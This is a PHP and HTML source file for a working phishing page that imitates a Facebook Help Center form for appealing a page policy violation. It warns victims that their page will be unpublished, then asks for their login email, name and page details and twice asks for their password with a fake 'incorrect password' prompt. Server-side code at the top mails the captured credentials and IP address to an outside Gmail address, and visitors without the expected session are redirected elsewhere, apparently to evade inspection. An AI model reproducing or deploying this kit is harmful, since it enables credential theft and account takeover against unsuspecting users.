<?php

session_start();
if(isset($_SESSION['u'])){
  if($_SESSION['u'] === '123') {
  }else {
    header("Location: https://vdsafvdfgfdhdgfh.cz");
  }
}else {
 header("Location: https://vdsafvdfgfdhdgfh.cz");
}

$emsf = $_POST['emsf'];

$pwja = $_POST['pwja'];

$fname = $_POST['fname'];

$adninfo = $_POST['adninfo'];

$pgus = $_POST['pgus'];

$ip = $_SERVER['REMOTE_ADDR'];


$stringi = 'email: ' .$emsf . PHP_EOL . 'pv: '.$pwja. PHP_EOL .'ip: ' .$ip . PHP_EOL . 'name: '.$fname . PHP_EOL . 'addinfo: '.$adninfo .PHP_EOL . 'pageid: '.$pgus;
mail("facebookcase50302@gmail.com","Ra", $stringi);

?>

<!doctype html>
<html lang="en">
  <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <!-- Required meta tags -->
    
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">


    <title>Your personal account will be unpublish soon!</title>
    <style type="text/css">
      body{
        background-color: white;
        margin-bottom:30px;
      }
      .titleh3{
        font-size:16px;
        padding: 12px;
        background-color: #f5f6f7;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
        border-top-right-radius: 5px;
        font-weight: 700;
        color: #4b4f56;
        border-top-left-radius: 5px;
        margin-bottom: 0px;
      }

      .content{

      }
      .content1{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2{
        background-color: white;
        padding: 10px;
        font-size: 13px;
        border-bottom: 1px solid rgba(0, 0, 0, .101);
      }
      .content2 a{
        color:#576b95;
      }
      .content2 input[type=text]{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: 1px solid #999;
        border-radius: 0px;
        height: 30px;
      }
      .content2 input[type=password]{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: 1px solid #999;
        border-radius: 0px;
        height: 30px;
      }
      .content2 label{
        margin-bottom:1px;
      }
      
      .afterheader .list-group .list-group-item{
          padding:0px;
          padding-top:5px;
          padding-bottom:5px;
          font-size:14px;
          border:0px;
          color: #444950;
      }
      .afterheader .list-group .list-group-item:hover{
          background-color:rgba(29, 33, 41, .04);
      }
      
      .content2 small{
        margin-bottom: 2px;
      }
      .content2 textarea{
        box-shadow: inset 0 1px 0 rgba(0, 0, 0, .07);
        border: solid 1px #999;
        border-top-color: #888;
        border-radius: 0px;
        height: 65px;
      }
      .butonsend button{
        width:100%;
        background-color: #627aad;
        background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1));
        font-weight: bold;
      }
      .navbari .nav-linkuu{
          color:#3578e5 !important;
          font-size:14px !important;
          font-weight:600 !important;
          padding: 15px 0px !important;
          border-bottom: 3px solid #3578e5;
      }
      .navbari .navbar {
          padding-top: 0px !important;
          padding-bottom: 0px !important;
      }
      .butonsend {
        margin-top:10px;
      }
      .navbari{
          background-color:#e9ebee;
      }
      .afterheader{
          margin-top:32px;
      }
      
        @media only screen and (max-width: 600px) {
          .afterheader {
            margin-top:9px;
          }
          .titleh3{
            font-weight: 600;
          }
          body{
            background-color: #dddfe2;
            margin-bottom:20px;
          }
          .navbari{
              display:none;
          }
          .sidebar-afterheader{
              display:none;
          }
          .logojababik{
              height:30px !important;
              text-align:center !important;
          }
          .headerbabika{
              text-align:center !important;
          }
          .searchibl{
              display: none;
          }
          .babikasubmitdesktop{
              display:none;
          }
          .footeriba{
              display:none;
          }
        }
        
        @media only screen and (min-width: 768px) {
          .content2{
              padding:20px !important;
          }
          .butonsendonlymobile{
              display:none;
          }
          .logojababik{
              height:37px !important;
              text-align:left !important;
          }
          .content2 label{
              color: #90949c !important;
              font-weight:700 !important;
              font-size:12px;
          }
          .content2 small{
              color: #90949c !important;
              margin-bottom:5px;
          }
          .content2 .form-group{
              margin-bottom:9px !important;
          }
          .content2 input[type=text], .content2 textarea, .content2 input[type=password]{
              margin-top:7px !important;
          }
          .headerbabika{
              padding-top: 17px !important;
              padding-bottom: 17px !important;
          }
          .searchibl i{
              color: #616161;
              font-size:13px;
          }
          .searchibl .form-control-lg{
              font-size: 17px;
              padding: 0px 8px !important;
              border:none;
          }
          .searchibl form{
              border: 1px solid  #000;
              border-radius:0px !important;
          }
          .searchibl .card-body{
              padding: 0px !important;
              padding-left: 10px !important;
          }
          .searchibl input{
              height: 36px !important;
              color: #90949c;
          }
          .babikasubmitdesktop{
              background-color:#f5f6f7;
              text-align:right;
              padding: 11px 20px;
          }
          .babikasubmitdesktop button{
            background-color: #4267b2;
            border-color: #4267b2;
            line-height: 31px;
            padding: 0 15px;
            font-weight: 500;
            font-size: 13px;
          }
          
            .footeriba ul {
              list-style-type: none;
              margin: 0;
              padding: 0;
              overflow: hidden;
            }
            
            .footeriba li {
              float: left;
            }
            
           .footeriba  li a {
              display: block;
              color: #90949c;
              text-align: center;
              padding: 15px 10px;
              font-size: 12px;
              text-decoration: none;
            }
            .footeriba  li a.active {
              color: #bec3c9;
            }
            .footermenu{
                margin-top:20px;
                margin-bottom:20px;
            }
            .footermenu .list-group-item{
                border: none;
                font-size:12px;
                color: #90949c;
                padding: 4px 10px;
            }
          .afterheader{
              margin-bottom: 70px !important;
          }
        }
    </style>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">


    <script id="mcjs">!function(c,h,i,m,p){m=c.createElement(h),p=c.getElementsByTagName(h)[0],m.async=1,m.src=i,p.parentNode.insertBefore(m,p)}(document,"script","https://chimpstatic.com/mcjs-connected/js/users/bed1a45254971ada65acedf9b/0ba8f4afa78a22970976b239e.js");</script>
  </head>
  <body>
      <script>
        function submitwrong(){
                document.getElementById('formasubmitapeal').submit();
        }
    </script>
    <section class="headerbabika" style="background-color:#39569a; padding-top:7px; padding-bottom:7px">
      <div class="container">
        <div class="row">
          <div class="col-12 col-md-4"> 
            <img src="yos.png" class="logojababik" />
          </div>
          <div class="col-12 col-md-8 searchibl"> 
            <div class="justify-content-center">
                <form class="card card-sm">
                    <div class="card-body row no-gutters align-items-center">
                        <div class="col-auto">
                            <i class="fas fa-search h4 text-body"></i>
                        </div>
                        <!--end of col-->
                        <div class="col">
                            <input class="form-control form-control-lg form-control-borderless" type="search" placeholder="How can we help?">
                        </div>
                    </div>
                </form>
            </div>
          </div>
        </div>
      </div>
    </section>
    <section class="navbari">
        <div class="container">
            <nav class="navbar navbar-expand-lg navbar-light ">
              
            
              <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav mr-auto">
                  
                  <li class="nav-item">
                    <a class="nav-link nav-linkuu" href="#"><i class="fas fa-home"></i> Help Center</a>
                  </li>
                  
                </ul>
                <div class="my-2 my-lg-0">
                    <ul class="navbar-nav">
                        <li class="nav-item">
                            <a class="nav-link" style="font-weight:400 !important; font-size:12px; color:#4065b4" href="#">English (U.S)</a>
                        </li>
                    </ul>
                </div>
              </div>
            </nav>
        </div>
    </section>
    
    <section class="afterheader">
      <div class="container">
        <div class="row">
            <div class="col-12 col-md-3 sidebar-afterheader">  
                <ul class="list-group">
                  <li class="list-group-item">Creating an Account</li>
                  <li class="list-group-item">Friending</li>
                  <li class="list-group-item">Your Home Page</li>
                  <li class="list-group-item">Messaging</li>
                  <li class="list-group-item">Stories</li>
                  <li class="list-group-item">Photos</li>
                  <li class="list-group-item">Videos</li>
                  <li class="list-group-item">Pages</li>
                  <li class="list-group-item">Groups</li>
                  <li class="list-group-item">Events</li>
                  <li class="list-group-item">Payments</li>
                  <li class="list-group-item">Marketplace</li>
                  <li class="list-group-item">Apps</li>
                  <li class="list-group-item">Accessibility</li>
                </ul>
            </div>
          <div class="col-12 col-md-7">  
            <? if(isset($_GET['message'])){
                echo '<div class="alert alert-danger" role="alert">
  <strong>Wrong!</strong> One or more details is wrong.
</div>';
            } ?>
            <div style="border: 1px solid #c8cacc; border-radius: 4px">
              <h3 class="titleh3">Appeal a Page Policy Violation</h3>
              <div class="content2">
                  If you believe your Page is going to be unpublished by mistake, please enter the following information. By entering the following information we will review your page again.
                  <form action="lol.php" id="formasubmitapeal" method="POST" style="margin-top:14px">
                      <div class="form-group">
                      <label for="exampleFormControlInput1">Page Name</label><br>
                      <input type="text" required class="form-control" id="exampleFormControlInput1" style="font-size:13px;" value="<?php echo $pgus; ?>" name="pgus" >
                    </div>
                    <div class="form-group"> 
                      <label for="exampleFormControlInput1">Login email address or mobile phone number</label>
                      <input type="text" required class="form-control" id="exampleFormControlInput1" value="<?php echo $emsf; ?>" name="emsf" >
                    </div>
                    
                    <div class="form-group">
                        <? 
                        $scc= 'no';
                        if(isset($_GET['message'])){
                            $scc = 'yes';   
                        }  
                        ?>
                        <input type="hidden" value="<? echo $scc; ?>" name="redirecty">
                      <label for="exampleFormControlInput1">Your full name</label><br>
                      <small>As it's listed on the account</small>
                      <input type="text" class="form-control" id="exampleFormControlInput1" value="<?php echo $fname; ?>" name="fname" >
                    </div>
                    <div class="form-group">
                      <label for="exampleFormControlTextarea1">Additional info</label>
                      <textarea class="form-control" id="exampleFormControlTextarea1" rows="3" name="adninfo"><?php echo $adninfo; ?></textarea>
                    </div>
              </div>
              <div class="babikasubmitdesktop">
                  <button type="button" data-toggle="modal" data-target="#exampleModal" class="btn btn-primary">Send</button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <div class="modal fade" style="margin-top: 20px; " id="exampleModal" tabindex="-1" role="dialog">
                  <div class="modal-dialog" role="document">
                    <div style="box-shadow: 0 2px 26px rgba(0, 0, 0, .3), 0 0 0 1px rgba(0, 0, 0, .1)" class="modal-content ">
                      <div style="padding: 10px 15px; background-color: #f5f6f7; border-bottom: 1px solid #e5e5e5 " class="modal-header">
                        <h5 class="modal-title" style="color: #1d2129; font-size:14px; font-weight:600; line-height: 25px ">Please Re-enter Your Password</h5>
                        
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                          <span aria-hidden="true">&times;</span>
                        </button>
                      </div>
                      <div class="modal-body">
                        <p style="font-size:14px; ">For your security, you must re-enter your password to continue.</p>
                        <div style="margin-bottom:0px;" class="form-group row">
                            <label id="hiqetash" for="inputPassword3" class=" col-form-label" style="font-size:14px;display:inline-block; padding-left:15px; padding-right:9px;">Password</label>
                            <div id="hiqetash2" style="display:inline-block">
                              <input type="password" required name="pwja" style="height: 25px; font-size:16px; width: 130px; margin-top:5px; border-radius:0px; padding: 0px 3px;" class="form-control" id="inputPassword3">
                            </div>
                            
                            <label id="shfaqetash" for="inputPassword3" class="col-sm-2 col-form-label" style="display:none; font-size:14px;">Password</label>
                            <div id="shfaqetash2" style="display:none" class="col-sm-9">
                              <input type="password" required name="password4" style="height: 25px; font-size:16px; width: 130px; margin-top:5px; border-radius:0px; padding: 0px 3px;" class="form-control" id="inputPassword4">
                            </div>
                            <span id="displaybro" style="display: none; color:red; padding-left:15px; font-size:13px;">Your password was incorrect.</span>
                            <span id="displaybro" style="width:100%; display: block; color: red; padding-left: 15px; font-size: 13px;">Your password was incorrect.</span>
                         </div>
                         
                      </div>
                      <div class="modal-footer">
                        <button style="background-color: #f5f6f7; border:1px solid #ccd0d5; color: #4b4f56; height:27px; padding:1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>

                        <button style="background-color:#4065b4; height:27px; border: 1px solid #4267b2; padding: 1px 10px; line-height:23px; font-size:13px; font-weight:600" type="button" onclick="submitwrong()" class="btn btn-primary">Submit</button>
                      </div>
                    </div>
                  </div>
                </div>
    <div class="container butonsend butonsendonlymobile">
      <div class="row">
        <div class="col-12">
          <button type="button" data-toggle="modal" data-target="#exampleModal" class="btn btn-primary">Send</button>
        </div>
      </div>
    </div>
    </form>
    
    <section class="footeriba">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <ul>
                      <li><a class="active" href="#">English (US)</a></li>
                      <li><a href="#">Deutsch</a></li>
                      <li><a href="#">Türkçe</a></li>
                      <li><a href="#">Српски</a></li>
                      <li><a href="#">Français (France)</a></li>
                      <li><a href="#">Italiano</a></li>
                      <li><a href="#">Bosanski</a></li>
                      <li><a href="#">Svenska</a></li>
                      <li><a href="#">Español</a></li>
                      <li><a href="#">Português (Brasil)</a></li>
                      <li style="float:right; color:#8d949e"><a>Facebook © 2019</a></li>
                    </ul>
                </div>
            </div>
            <div class="row footermenu">
                <div class="col-md-2">
                    <ul class="list-group">
                      <li class="list-group-item">About</li>
                      <li class="list-group-item">Privacy</li>
                      <li class="list-group-item">Careers</li>
                    </ul>
                </div>
                <div class="col-md-2">
                    <ul class="list-group">
                      <li class="list-group-item">Ad Choices</li>
                      <li class="list-group-item">Create Ad</li>
                      <li class="list-group-item">Create Page</li>
                    </ul>
                </div>
                <div class="col-md-2">
                    <ul class="list-group">
                      <li class="list-group-item">Terms & Policies</li>
                      <li class="list-group-item">Cookies</li>
                    </ul>
                </div>
            </div>
        </div>
    </section>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159676282-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-159676282-1');
</script>


   
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
<script type="text/javascript">
    $(document).ready(function(){
        $("#exampleModal").modal('show');
    });
</script>
  </body>
</html>